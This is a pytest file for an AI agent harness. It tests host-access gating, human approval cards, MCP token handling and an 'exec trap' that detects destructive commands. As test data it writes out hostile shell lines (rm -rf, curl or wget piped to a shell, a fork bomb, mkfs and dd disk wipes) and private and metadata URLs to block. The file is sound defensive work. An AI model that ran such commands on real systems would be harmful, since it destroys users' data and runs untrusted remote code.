"""Phase 5 unit tests (no Hermes import): host settings in the rendered config (contract test 14's
config half), MCP modes and token files, run.start's host checks, the self-test's host check, the
gate's host rules with a fake Go, and the exec trap's patterns."""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

import exec_trap
import harness
from timely_agent import bridge, config_render, mcp_tokens, policy, selftest
from timely_agent.worker import host_start_problem, run_start_problem

SKILLS = harness.TEST_ROOT  # any folder: the floors only name it


def _cfg(settings: dict, workspace: Path | None = None) -> dict:
    cfg, _ = config_render.account_config(settings, timely_skills_dir=SKILLS, workspace=workspace)
    return cfg


# ---------------------------------------------------------------- contract test 14 (config half)

def test_c14_a_non_host_account_never_renders_host_settings(tmp_path):
    """Contract test 14: an account that is not host-allowed never gets a ``command`` MCP server,
    ``terminal.home_mode: real``, the real browser profile, checkpoints or a working folder, even
    when the settings ask for them; render-account names what it ignored."""
    entry = {"command": "/usr/bin/fake-mcp", "args": ["--stdio"]}
    settings = {"host_allowed": False, "terminal_home_mode": "real", "working_dir": str(tmp_path),
                "checkpoints": True, "browser": {"use_real_profile": True},
                "mcp_servers": {"local": entry}, "approved_mcp_hashes": [config_render.mcp_entry_hash(entry)],
                "toolsets": ["timely", "terminal"]}
    cfg = _cfg(settings, workspace=tmp_path / "ws")
    assert cfg["terminal"]["home_mode"] == "profile"
    assert cfg["terminal"]["cwd"] == str(tmp_path / "ws")
    assert cfg["browser"]["use_real_profile"] is False
    assert cfg["checkpoints"]["enabled"] is False
    assert cfg["mcp_servers"] == {}
    host = config_render.host_settings(settings)
    assert set(host["ignored"]) == {"home_mode", "working_dir", "checkpoints", "use_real_profile"}
    # the self-test's own check refuses such a config if it ever appeared
    bad = {"toolsets": ["terminal"], "terminal": {"home_mode": "real"}, "browser": {"use_real_profile": True},
           "checkpoints": {"enabled": True}}
    problems = selftest.host_problems({"host_allowed": False}, bad, {"TERMINAL_HOME_MODE": "real"})
    assert len(problems) == 5, problems
    assert selftest.host_problems({"host_allowed": True}, bad, {}) == []
    assert selftest.host_problems({"host_allowed": False}, cfg, {}) == []


@pytest.mark.parametrize("url", ["http://100.64.0.1/mcp", "http://127.0.0.1:9/mcp", "http://localhost/mcp",
                                 "http://169.254.169.254/latest", "http://[::1]/mcp", "http://10.0.0.5/mcp",
                                 "http://192.168.1.2/mcp", "http://0.0.0.0/mcp"])
def test_c14_private_remote_mcp_urls_are_dropped(url):
    """Contract test 14: a remote MCP URL on a CGNAT/Tailscale, loopback, link-local (metadata) or
    private literal is never rendered, for any account."""
    for allowed in (False, True):
        cfg = _cfg({"host_allowed": allowed, "mcp_servers": {"x": {"url": url}}})
        assert cfg["mcp_servers"] == {}, (url, allowed)
    assert _cfg({"mcp_servers": {"x": {"url": "https://mcp.example.com/sse"}}})["mcp_servers"] == {
        "x": {"url": "https://mcp.example.com/sse"}}


def test_host_allowed_account_renders_real_home_working_folder_checkpoints_and_profile(tmp_path):
    entry = {"command": "/usr/bin/fake-mcp"}
    settings = harness.host_settings(tmp_path, working_dir=str(tmp_path), browser={"use_real_profile": True},
                                     mcp_servers={"local": entry, "notyet": {"command": "/bin/other"}},
                                     approved_mcp_hashes=[config_render.mcp_entry_hash(entry)])
    cfg = _cfg(settings, workspace=tmp_path / "ws")
    assert cfg["terminal"] == {"backend": "local", "home_mode": "real", "cwd": str(tmp_path.resolve())}
    assert cfg["checkpoints"] == {"enabled": True, "max_snapshots": config_render.CHECKPOINT_MAX_SNAPSHOTS}
    assert cfg["browser"]["use_real_profile"] is True
    assert cfg["browser"]["auto_local_for_private_urls"] is False  # the floor still holds
    assert set(cfg["mcp_servers"]) == {"local"}  # stdio only with an approved hash
    # a working folder that does not exist leaves the workspace in place
    cfg = _cfg({**settings, "working_dir": str(tmp_path / "missing")}, workspace=tmp_path / "ws")
    assert cfg["terminal"]["cwd"] == str(tmp_path / "ws")


def test_managed_floors_no_longer_pin_the_real_profile():
    """Q-5.3: browser.use_real_profile moved from the managed floor to the account config."""
    leaves = config_render.floor_leaves(config_render.managed_floors(timely_skills_dir=None))
    assert "browser.use_real_profile" not in leaves
    assert leaves["browser.auto_local_for_private_urls"] is False


def test_approval_timeout_stays_above_the_longest_live_wait():
    assert _cfg({"approval_timeout_s": 600})["approvals"]["timeout"] == policy.APPROVAL_TIMEOUT_FLOOR_S
    assert _cfg({"approval_timeout_s": 99999})["approvals"]["timeout"] == 99999
    assert policy.APPROVAL_TIMEOUT_FLOOR_S > policy.HOST_LIVE_WAIT_MAX_S


def test_mcp_modes_off_servers_are_not_rendered():
    servers = {"a": {"url": "https://a.example.com/mcp"}, "b": {"url": "https://b.example.com/mcp"},
               "c": {"url": "https://c.example.com/mcp"}}
    cfg = _cfg({"mcp_servers": servers, "mcp_modes": {"a": "use", "b": "off", "c": "weird"}})
    assert set(cfg["mcp_servers"]) == {"a", "c"}
    assert config_render.mcp_modes({"mcp_modes": {"c": "weird", "a": "use"}}) == {"c": "ask", "a": "use"}


# ---------------------------------------------------------------- MCP token files

def test_mcp_token_files_written_read_back_and_removed(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    tokens = {"cal": {"tokens": {"access_token": "a1", "refresh_token": "r1"}, "client_info": {"client_id": "c"}},
              "drive": {"access_token": "bare"}, "gone": {"tokens": {"access_token": "x"}}}
    (home / "mcp-tokens").mkdir()
    (home / "mcp-tokens" / "stale.json").write_text("{}")
    written = mcp_tokens.write(home, tokens, keep={"cal", "drive"})
    assert set(written) == {"cal.json", "cal.client.json", "drive.json"}
    assert not (home / "mcp-tokens" / "stale.json").exists() and not (home / "mcp-tokens" / "gone.json").exists()
    assert oct((home / "mcp-tokens" / "cal.json").stat().st_mode & 0o777) == "0o600"
    config_render.write_atomic(home / config_render.ACCOUNT_STATE,
                               json.dumps({"mcp_token_files": written}).encode())
    assert mcp_tokens.read_back(home, changed_only=True) == {}
    # Hermes refreshed one token in place: only that server is reported, once
    (home / "mcp-tokens" / "cal.json").write_text(json.dumps({"access_token": "a2", "refresh_token": "r2"}))
    back = mcp_tokens.read_back(home, changed_only=True)
    assert back == {"cal": {"tokens": {"access_token": "a2", "refresh_token": "r2"}, "client_info": {"client_id": "c"}}}
    assert mcp_tokens.read_back(home, changed_only=True) == {}
    assert set(mcp_tokens.read_back(home, changed_only=False)) == {"cal", "drive"}
    mcp_tokens.remove(home)
    assert not (home / "mcp-tokens").exists()


# ---------------------------------------------------------------- run.start host checks

BASE = {"type": "run.start", "run": "r", "conversation_id": "c", "toolsets": ["timely"], "flags": {},
        "model": {"provider": "custom", "model": "m"}}


@pytest.mark.parametrize("toolset", policy.HOST_TOOLSETS)
def test_host_toolsets_need_the_flag_and_a_host_allowed_account(toolset):
    msg = {**BASE, "toolsets": ["timely", toolset]}
    assert run_start_problem(msg, account_host_allowed=True)  # no flag
    assert run_start_problem({**msg, "flags": {"host_allowed": True}}, account_host_allowed=False)
    assert run_start_problem({**msg, "flags": {"host_allowed": True}}, account_host_allowed=True) is None
    assert run_start_problem({**msg, "flags": {"host_allowed": "yes"}}, account_host_allowed=True)


def test_full_access_live_wait_and_pre_approved_shapes():
    ok = {**BASE, "permission": "full", "flags": {"full_access": True}}
    assert host_start_problem(ok, False) is None
    assert host_start_problem({**ok, "permission": "auto"}, False)
    for wait in (0, -1, 3601, True, "600"):
        assert host_start_problem({**BASE, "host_live_wait_s": wait}, False), wait
    assert host_start_problem({**BASE, "host_live_wait_s": 2}, False) is None
    digest = policy.args_hash({"command": "ls"})
    assert host_start_problem({**BASE, "pre_approved": {"tool": "terminal", "args_hash": digest,
                                                        "tool_call_id": "call_1"}}, False) is None
    assert host_start_problem({**BASE, "pre_approved": {"tool": "terminal", "args_hash": "short"}}, False)
    assert host_start_problem({**BASE, "pre_approved": {"args_hash": digest}}, False)


# ---------------------------------------------------------------- the gate's host rules (fake Go)

def _gate(run: bridge.RunContext, tool: str, args: dict, call_id: str = "call_1", verdict: str = "allow",
          by: str = "", **hook):
    from timely_agent.plugins import timely_gate
    asked: list[dict] = []
    old = bridge.ask
    reply = {"type": "gate.verdict", "verdict": verdict, **({"by": by} if by else {})}
    bridge.ask = lambda msg, timeout: asked.append(msg) or reply
    token = bridge.current_run.set(run)
    try:
        return timely_gate.pre_tool_call(tool_name=tool, args=args, tool_call_id=call_id, **hook), asked
    finally:
        bridge.current_run.reset(token)
        bridge.ask = old


def _run(**kw) -> bridge.RunContext:
    return bridge.RunContext(run_id="r", session_key="k", conversation_id="c", **kw)


def test_gate_host_calls_always_ask_go_with_args_hash():
    args = {"command": "ls"}
    verdict, asked = _gate(_run(host_allowed=True), "terminal", args)
    assert verdict is None and len(asked) == 1
    assert asked[0]["args_hash"] == policy.args_hash(args) and "inner" not in asked[0] and "mcp" not in asked[0]


@pytest.mark.parametrize("tool,args", [("terminal", {"command": "ls"}), ("read_file", {"path": "/etc/hosts"}),
                                       ("write_file", {"path": "x", "content": "y"}),
                                       ("execute_code", {"code": "print(1)"}),
                                       ("vision_analyze", {"image_url": "/home/me/photo.png"})])
def test_gate_blocks_host_calls_for_a_non_host_run_and_in_bots(tool, args):
    verdict, asked = _gate(_run(), tool, args)
    assert verdict["action"] == "block" and verdict["message"] == policy.NOT_HOST_ALLOWED and asked == []
    verdict, asked = _gate(_run(host_allowed=True, kind="bot"), tool, args)
    assert verdict["action"] == "block" and verdict["message"] == policy.BOT_HOST and asked == []


def test_gate_vision_on_a_url_is_not_a_host_call():
    assert not policy.is_host_call("vision_analyze", {"image_url": "https://example.com/a.png"})
    assert policy.is_host_call("vision_analyze", {"image_url": "~/a.png"})


def test_gate_a_stopped_run_blocks_every_call():
    run = _run(host_allowed=True)
    run.stopped = lambda: True
    for tool in ("terminal", "todo_list", "web_search"):
        verdict, asked = _gate(run, tool, {})
        assert verdict == {"action": "block", "message": policy.STOPPED} and asked == []


def test_gate_pre_approved_matches_one_call_exactly_once():
    args = {"command": "rm -rf x"}
    run = _run(host_allowed=True, pre_approved={"tool": "terminal", "args_hash": policy.args_hash(args)})
    verdict, asked = _gate(run, "terminal", {"command": "rm -rf y"}, verdict="block")
    assert verdict["action"] == "block" and len(asked) == 1  # other arguments: asks Go
    verdict, asked = _gate(run, "terminal", args, call_id="call_2", verdict="block")
    assert verdict is None and asked == [] and run.is_approved("call_2")
    verdict, asked = _gate(run, "terminal", args, call_id="call_3", verdict="block")
    assert verdict["action"] == "block" and len(asked) == 1  # a second identical call asks again


def test_gate_approve_records_the_card_and_suspends_full_access_yolo(monkeypatch):
    from timely_agent import host
    suspended = []
    monkeypatch.setattr(host, "suspend_yolo", lambda run: suspended.append(run.run_id))
    run = _run(host_allowed=True, full_access=True)
    verdict, _ = _gate(run, "terminal", {"command": "ls"}, call_id="call_9", verdict="approve")
    assert verdict["action"] == "approve" and verdict["rule_key"] == "timely:call_9"
    assert run.asked_for("call_9") == {"tool": "terminal", "args_hash": policy.args_hash({"command": "ls"}),
                                      "toolset": ""}
    assert suspended == ["r"] and not run.is_approved("call_9")
    verdict, _ = _gate(run, "terminal", {"command": "ls"}, call_id="call_10", verdict="allow")
    assert verdict is None and run.is_approved("call_10")


def test_gate_skills_folder_reads_run_without_asking(tmp_path, monkeypatch):
    monkeypatch.setenv("HERMES_HOME", str(tmp_path))
    (tmp_path / "skills" / "a").mkdir(parents=True)
    (tmp_path / "skills" / "a" / "SKILL.md").write_text("x")
    (tmp_path / "skills" / "escape").symlink_to("/etc")
    run = _run(host_allowed=True)
    assert _gate(run, "read_file", {"path": str(tmp_path / "skills" / "a" / "SKILL.md")}, verdict="block") == (None, [])
    for path in (str(tmp_path / "skills" / "escape" / "hosts"), str(tmp_path / "other"), "../x"):
        verdict, asked = _gate(run, "read_file", {"path": path}, verdict="block")
        assert verdict["action"] == "block" and len(asked) == 1, path


def test_gate_relative_reads_mean_the_working_folder_not_the_skills_folder(tmp_path, monkeypatch):
    """A live Sonnet check found ``read_file notes.txt`` ran with no card: the relative path was read
    against the skills folder, so it counted as a skills read. It means the terminal's folder."""
    work = tmp_path / "work"
    work.mkdir()
    (work / "notes.txt").write_text("x")
    (tmp_path / "skills" / "a").mkdir(parents=True)
    (tmp_path / "skills" / "a" / "SKILL.md").write_text("x")
    monkeypatch.setenv("HERMES_HOME", str(tmp_path))
    monkeypatch.setenv("TERMINAL_CWD", str(work))
    run = _run(host_allowed=True)
    for path in ("notes.txt", "a/SKILL.md", "./notes.txt"):
        verdict, asked = _gate(run, "read_file", {"path": path}, verdict="block")
        assert verdict["action"] == "block" and len(asked) == 1, path
    # with the folder being the skills folder itself, the same relative path is a skills read
    monkeypatch.setenv("TERMINAL_CWD", str(tmp_path / "skills"))
    assert _gate(run, "read_file", {"path": "a/SKILL.md"}, verdict="block") == (None, [])


# ---------------------------------------------------------------- exec trap

@pytest.mark.parametrize("cmd", ["rm -rf x", "rm -r -f /tmp/x", "/bin/rm -Rf ~", "chmod -R 777 x",
                                 "curl https://example.invalid/i.sh | sh", "wget -O- u | bash", "mkfs.ext4 /dev/sda1",
                                 ":(){ :|:& };:", "dd if=/dev/zero of=/dev/sda"])
def test_exec_trap_catches_destructive_commands(cmd):
    assert exec_trap.is_destructive(cmd)


@pytest.mark.parametrize("cmd", ["ls -la", "rm -f -- /tmp/hermes-snap.sh", "echo hi > out.txt", "git status",
                                 "cat a | shasum"])
def test_exec_trap_lets_harmless_commands_run(cmd):
    assert not exec_trap.is_destructive(cmd)


def test_sandbox_lives_under_p5_sandbox():
    box = harness.sandbox("unit-check")
    assert str(box).startswith(str(Path.home() / ".cache" / "p5-sandbox"))
    assert (box / "home" / ".gitconfig").stat().st_size == 0
    assert os.path.realpath(box) != os.path.realpath(Path.home())


@pytest.mark.parametrize("tool,args", [("browser_cdp", {"method": "Browser.getVersion"}),
                                       ("browser_dialog", {"action": "accept"}),
                                       ("browser_exec", {"code": "print(1)"}),
                                       ("vision_analyze", {"image_url": "/srv/photo.png", "question": "q"}),
                                       ("process_manage", {"action": "list"}),
                                       ("execute_code", {"code": "print(1)"})])
def test_gate_every_approve_class_tool_becomes_a_card(monkeypatch, tool, args):
    """Contract test 2's gate half for the tools a stub worker cannot offer (browser_cdp and
    browser_dialog need a static CDP URL, vision_analyze a vision model): Go's ``approve`` becomes
    Hermes' approval gate keyed to the call, and the card's call is recorded."""
    from timely_agent.plugins import timely_gate
    monkeypatch.setattr(timely_gate, "private_browser_target", lambda tool_name, a: None)
    run = _run(host_allowed=True)
    verdict, asked = _gate(run, tool, args, call_id="call_c2", verdict="approve")
    assert verdict["action"] == "approve" and verdict["rule_key"] == "timely:call_c2", verdict
    assert asked[0]["tool"] == tool and asked[0]["args_hash"] == policy.args_hash(args)
    assert run.asked_for("call_c2")["tool"] == tool and not run.is_approved("call_c2")


# ---------------------------------------------------------------- the approval bridge (fake Hermes)

class FakeApproval:
    """Stands in for ``tools.approval``'s queue: what the bridge resolves, withdraws and observes."""

    def __init__(self):
        self.resolved: list[tuple] = []
        self.withdrawn: list[tuple] = []
        self.observers: dict[str, object] = {}
        self.pending: set[str] = set()
        self.yolo: list[tuple] = []

    def resolve_gateway_approval(self, key, choice, resolve_all=False, reason=None, request_id=None):
        self.resolved.append((key, choice, request_id, resolve_all))
        if request_id in self.pending:
            self.pending.discard(request_id)
            if request_id in self.observers:
                self.observers.pop(request_id)("resolved")
            return 1
        return 0

    def withdraw_gateway_approval(self, key, request_id, cause):
        if request_id not in self.pending:
            return False
        self.pending.discard(request_id)
        self.withdrawn.append((key, request_id, cause))
        if request_id in self.observers:
            self.observers.pop(request_id)("session_closed")
        return True

    def observe_gateway_settle(self, key, request_id, observer):
        self.observers[request_id] = observer
        return True

    def enable_session_yolo(self, key):
        self.yolo.append(("on", key))

    def disable_session_yolo(self, key):
        self.yolo.append(("off", key))


@pytest.fixture
def fake_hermes(monkeypatch):
    import sys
    import types
    fake = FakeApproval()
    pkg = types.ModuleType("tools")
    pkg.__path__ = []
    mod = types.ModuleType("tools.approval")
    for name in ("resolve_gateway_approval", "withdraw_gateway_approval", "observe_gateway_settle",
                 "enable_session_yolo", "disable_session_yolo"):
        setattr(mod, name, getattr(fake, name))
    monkeypatch.setitem(sys.modules, "tools", pkg)
    monkeypatch.setitem(sys.modules, "tools.approval", mod)
    return fake


class FakeAgent:
    def __init__(self):
        self.interrupts = []

    def interrupt(self, message=None, tool_reason=None):
        self.interrupts.append(tool_reason)


def _bridge_run(**kw):
    events: list[tuple[str, dict]] = []
    run = _run(host_allowed=True, **kw)
    run.emit = lambda kind, payload: events.append((kind, payload))
    run.agent = FakeAgent()
    return run, events


def test_bridge_a_timely_card_goes_to_go_and_parks_when_the_live_wait_ends(fake_hermes):
    """Decision 2: the card reaches Go with the call; when the live wait ends unanswered it is
    withdrawn with the parked text, ``approval.parked`` goes out and the turn ends softly."""
    import time
    from timely_agent import host
    run, events = _bridge_run(host_live_wait_s=0.2)
    run.note_asked("call_1", {"tool": "terminal", "args_hash": "h" * 64, "toolset": "terminal"})
    notify = host.notifier(lambda: run, run.emit, "k")
    fake_hermes.pending.add("req-1")
    notify({"request_id": "req-1", "pattern_key": "plugin_rule:timely:call_1", "command": "<terminal>",
            "pattern_keys": ["plugin_rule:timely:call_1"], "description": "Run this command?"})
    kind, payload = events[0]
    assert kind == "approval.request" and payload["tool_call_id"] == "call_1" and payload["tool"] == "terminal"
    assert payload["args_hash"] == "h" * 64 and payload["live_wait_s"] == 0 and "pattern_keys" not in payload
    deadline = time.monotonic() + 5
    while run.parked is None and time.monotonic() < deadline:
        time.sleep(0.02)
    info = {"request_id": "req-1", "tool": "terminal", "args_hash": "h" * 64, "tool_call_id": "call_1"}
    assert run.parked == info and ("approval.parked", info) in events
    assert fake_hermes.withdrawn == [("k", "req-1", policy.PARKED_TEXT)]
    assert run.agent.interrupts == [host.PARKED_REASON] and host.pending("r") == []


def test_bridge_run_once_marks_the_call_and_hermes_second_approval_is_answered_once(fake_hermes):
    """Decision 4: Run once records the call; Hermes' own approval raised for it on this thread
    is answered once (``approval.auto``); one raised for any other call is denied."""
    from timely_agent import host
    run, events = _bridge_run(host_live_wait_s=60)
    run.note_asked("call_1", {"tool": "terminal", "args_hash": "a" * 64})
    notify = host.notifier(lambda: run, run.emit, "k")
    fake_hermes.pending.add("req-1")
    host.mark_executing(run, "call_1")
    notify({"request_id": "req-1", "pattern_key": "plugin_rule:timely:call_1"})
    assert host.answer(run, "k", "req-1", "once") is True and run.is_approved("call_1")
    assert host.answer(run, "k", "req-1", "once") is False  # answered already
    fake_hermes.pending.add("req-2")
    notify({"request_id": "req-2", "pattern_key": "recursive_delete"})
    assert ("k", "once", "req-2", False) in fake_hermes.resolved
    assert ("approval.auto", {"request_id": "req-2", "tool_call_id": "call_1", "pattern_key": "recursive_delete"}) in events
    host.mark_executing(run, "call_other")
    fake_hermes.pending.add("req-3")
    notify({"request_id": "req-3", "pattern_key": "recursive_delete"})
    assert ("k", "deny", "req-3", False) in fake_hermes.resolved
    assert sum(1 for k, _ in events if k == "approval.request") == 1


def test_bridge_stop_denies_a_waiting_card_and_refuses_a_late_run_once(fake_hermes):
    from timely_agent import host
    run, _ = _bridge_run(host_live_wait_s=60)
    run.note_asked("call_1", {"tool": "terminal", "args_hash": "a" * 64})
    notify = host.notifier(lambda: run, run.emit, "k")
    fake_hermes.pending.add("req-1")
    notify({"request_id": "req-1", "pattern_key": "plugin_rule:timely:call_1"})
    run.stopped = lambda: True
    assert host.deny_pending(run, "k") >= 1
    assert ("k", "deny", "req-1", False) in fake_hermes.resolved
    assert host.answer(run, "k", "req-1", "once") is False and not run.is_approved("call_1")


def test_bridge_full_access_yolo_is_suspended_by_a_card(fake_hermes):
    from timely_agent import host
    run, _ = _bridge_run(full_access=True)
    host.start_yolo(run)
    assert run.yolo and fake_hermes.yolo == [("on", "k")]
    host.suspend_yolo(run)
    host.end_yolo(run)
    assert not run.yolo and fake_hermes.yolo == [("on", "k"), ("off", "k"), ("off", "k")]
    plain, _ = _bridge_run()
    host.start_yolo(plain)
    assert not plain.yolo and len(fake_hermes.yolo) == 3


def test_c14_render_account_through_the_cli_drops_host_settings_for_a_non_host_account():
    """Contract test 14 through render-account itself (the helper Go runs)."""
    entry = {"command": "/usr/bin/fake-mcp"}
    a = harness.Agent(harness.new_root("c14"), settings={
        "host_allowed": False, "terminal_home_mode": "real", "checkpoints": True,
        "browser": {"use_real_profile": True}, "toolsets": ["timely", "terminal", "file"],
        "mcp_servers": {"local": entry, "tail": {"url": "http://100.64.0.1/mcp"}},
        "approved_mcp_hashes": [config_render.mcp_entry_hash(entry)]})
    cfg = json.loads((a.home / "config.yaml").read_text().split("\n", 1)[1])
    assert cfg["terminal"]["home_mode"] == "profile" and cfg["browser"]["use_real_profile"] is False
    assert cfg["checkpoints"]["enabled"] is False and cfg["mcp_servers"] == {}
    assert not set(cfg["toolsets"]) & set(policy.HOST_TOOLSETS)
    assert set(a.rendered["host_ignored"]) == {"home_mode", "checkpoints", "use_real_profile"}
    state = config_render.account_state(a.home)
    assert state["host_allowed"] is False and state["use_real_profile"] is False


# ---------------------------------------------------------------- review findings: who stands behind a call

def test_gate_an_auto_allow_has_no_person_behind_it_but_a_grant_and_full_access_do():
    run = _run(host_allowed=True)
    for call, by, backed in (("a", "auto", False), ("g", "grant", True), ("f", "full", True), ("n", "", True)):
        verdict, _ = _gate(run, "terminal", {"command": "ls"}, call_id=call, verdict="allow", by=by)
        assert verdict is None and run.is_approved(call) and run.is_backed(call) is backed, (call, by)
    run.approve_call("a", "h")  # a person's Run once on that call later backs it
    assert run.is_backed("a")


def test_bridge_hermes_flag_on_a_call_go_allowed_by_auto_becomes_a_card(fake_hermes):
    """Review finding: Go's Auto allow is not a person's OK, so Hermes' own dangerous-command prompt
    for that call must reach the person as a card (``hermes_flag``), never an automatic ``once``."""
    from timely_agent import host
    run, events = _bridge_run(host_live_wait_s=60)
    run.approve_call("call_1", "a" * 64, backed=False)
    run.note_call("terminal", "call_1")
    notify = host.notifier(lambda: run, run.emit, "k")
    fake_hermes.pending.add("req-1")
    host.mark_executing(run, "call_1")
    notify({"request_id": "req-1", "pattern_key": "recursive_delete", "description": "recursive delete"})
    assert not any(c == "once" for _, c, _, _ in fake_hermes.resolved)
    assert not [e for e in events if e[0] == "approval.auto"]
    kind, payload = events[0]
    assert kind == "approval.request" and payload["hermes_flag"] is True and payload["tool_call_id"] == "call_1"
    assert payload["tool"] == "terminal" and payload["args_hash"] == "a" * 64
    # Run once on that card backs the call, and the next prompt for it is answered
    assert host.answer(run, "k", "req-1", "once") is True and run.is_backed("call_1")
    fake_hermes.pending.add("req-2")
    notify({"request_id": "req-2", "pattern_key": "recursive_delete"})
    assert ("k", "once", "req-2", False) in fake_hermes.resolved


def test_bridge_hermes_flag_after_a_grant_or_full_access_is_answered_once(fake_hermes):
    from timely_agent import host
    for by in ("grant", "full"):
        run, events = _bridge_run()
        run.approve_call("call_1", "a" * 64, backed=by != "auto")
        notify = host.notifier(lambda r=run: r, run.emit, "k")
        fake_hermes.pending.add(f"req-{by}")
        host.mark_executing(run, "call_1")
        notify({"request_id": f"req-{by}", "pattern_key": "recursive_delete"})
        assert ("k", "once", f"req-{by}", False) in fake_hermes.resolved
        assert [e[0] for e in events] == ["approval.auto"]


@pytest.mark.parametrize("status,fenced,stopping,want", [
    (None, False, False, "ok"), ("ok", False, False, "ok"), ("blocked", False, False, "blocked"),
    ("cancelled", False, False, "cancelled"), ("cancelled", False, True, "cancelled"),
    ("timeout", False, False, "timeout"), ("error", False, False, "error"), ("error", False, True, "interrupted"),
    ("ok", True, False, "blocked"), ("cancelled", True, True, "blocked"), ("surprise", False, False, "error"),
])
def test_host_ran_status_is_ok_only_for_a_call_that_finished(status, fenced, stopping, want):
    """Review finding: Hermes' ``cancelled`` (slot abandoned after a Stop) and ``timeout`` used to
    read ``ok``, so the audit and the card believed a call ran that never started."""
    from timely_agent import host
    assert host.ran_state(status, fenced, stopping) == want


def test_report_ran_never_looks_up_a_checkpoint_for_a_call_that_is_not_ok(monkeypatch):
    from timely_agent import host
    run, events = _bridge_run()
    called = []
    monkeypatch.setattr(host, "checkpoint_for", lambda *a: called.append(a) or ("abc", "/w"))
    host.report_ran(run, "write_file", {"path": "x"}, "call_1", "cancelled")
    assert events == [("host.ran", {"tool_call_id": "call_1", "tool": "write_file",
                                    "args_hash": policy.args_hash({"path": "x"}), "status": "cancelled"})]
    assert called == []
    host.report_ran(run, "write_file", {"path": "x"}, "call_2", "ok")
    assert events[1][1]["checkpoint"] == "abc" and called


def test_stdin_floor_refuses_what_hermes_would_block_typed_into_a_running_command(monkeypatch):
    """Hermes guards no stdin: ``process`` write/submit of a hardline command is refused by the
    gate (the real ``_floor_block`` is exercised in the contract test)."""
    import sys
    import types
    from timely_agent import host
    mod = types.ModuleType("tools.approval")
    mod._floor_block = lambda c: {"approved": False, "message": "BLOCKED (hardline)"} if "rm -rf /" in c else None
    pkg = types.ModuleType("tools")
    pkg.__path__ = []
    monkeypatch.setitem(sys.modules, "tools", pkg)
    monkeypatch.setitem(sys.modules, "tools.approval", mod)
    for tool in ("process", "process_manage"):
        for action in ("write", "submit"):
            assert host.stdin_floor(tool, {"action": action, "data": "rm -rf /\n"}).startswith("BLOCKED")
            assert host.stdin_floor(tool, {"action": action, "input": "rm -rf /"}).startswith("BLOCKED")
            assert host.stdin_floor(tool, {"action": action, "data": "y"}) == ""
        assert host.stdin_floor(tool, {"action": "poll", "data": "rm -rf /"}) == ""
    assert host.stdin_floor("terminal", {"command": "rm -rf /"}) == ""
    verdict, asked = _gate(_run(host_allowed=True), "process_manage",
                           {"action": "submit", "session_id": "p", "data": "rm -rf /"}, verdict="allow")
    assert verdict["action"] == "block" and verdict["message"].startswith("BLOCKED") and asked == []
    verdict, asked = _gate(_run(host_allowed=True), "process_manage",
                           {"action": "submit", "session_id": "p", "data": "y"}, verdict="allow")
    assert verdict is None and len(asked) == 1


def test_gate_ask_carries_the_terminal_sessions_folder(monkeypatch):
    """Review round 2: a call without a ``workdir`` runs in the folder an earlier ``cd`` left the
    session in, so ``gate.ask`` names it and Go judges relative paths from there."""
    import sys
    import types
    mod = types.ModuleType("tools.terminal_tool")
    seen = []
    mod.get_session_cwd = lambda key: seen.append(key) or ({"task-1": "/home/me/Documents"}.get(key))
    pkg = types.ModuleType("tools")
    pkg.__path__ = []
    monkeypatch.setitem(sys.modules, "tools", pkg)
    monkeypatch.setitem(sys.modules, "tools.terminal_tool", mod)
    verdict, asked = _gate(_run(host_allowed=True), "terminal", {"command": "rm thesis.md"}, task_id="task-1", session_id="s-1")
    assert verdict is None and asked[0]["cwd"] == "/home/me/Documents"
    _, asked = _gate(_run(host_allowed=True), "terminal", {"command": "ls"}, task_id="other", session_id="s-1")
    assert "cwd" not in asked[0]  # no record: Go uses the working folder
    _, asked = _gate(_run(host_allowed=True), "write_file", {"path": "a", "content": "b"}, task_id="task-1")
    assert asked[0]["cwd"] == "/home/me/Documents"
    mod.get_session_cwd = lambda key: (_ for _ in ()).throw(RuntimeError("no session"))
    _, asked = _gate(_run(host_allowed=True), "terminal", {"command": "ls"}, task_id="task-1")
    assert "cwd" not in asked[0]  # a failing lookup never blocks or breaks the ask
